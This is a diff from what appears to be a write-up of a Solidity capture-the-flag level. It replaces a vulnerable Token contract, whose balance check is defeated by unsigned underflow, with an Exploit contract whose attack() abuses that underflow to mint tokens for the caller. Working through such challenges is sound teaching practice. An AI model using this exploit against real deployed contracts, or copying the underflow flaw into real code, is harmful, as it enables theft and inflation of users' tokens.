@@ -33,23 +33,22 @@ So to give myself some token for free and ruin the entire economy of this contra
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.6.0;
 
-contract Token {
-    mapping(address => uint256) balances;
-    uint256 public totalSupply;
+import './Token.sol';
 
-    constructor(uint256 _initialSupply) public {
-        balances[msg.sender] = totalSupply = _initialSupply;
+contract Exploit{
+    Token token;
+
+    // constructor to instantiate the vulnerable contract 
+    constructor(Token _token) public {
+        token = _token;
     }
 
-    function transfer(address _to, uint256 _value) public returns (bool) {
-        require(balances[msg.sender] - _value >= 0);
-        balances[msg.sender] -= _value;
-        balances[_to] += _value;
-        return true;
-    }
-
-    function balanceOf(address _owner) public view returns (uint256 balance) {
-        return balances[_owner];
+    function attack() public returns (bool){
+        // transfer - my balance + the total of supply of tokens,
+        return token.transfer(
+            msg.sender,
+            uint256(-token.balanceOf(msg.sender)) + 21000000
+        );
     }
 }
 ```
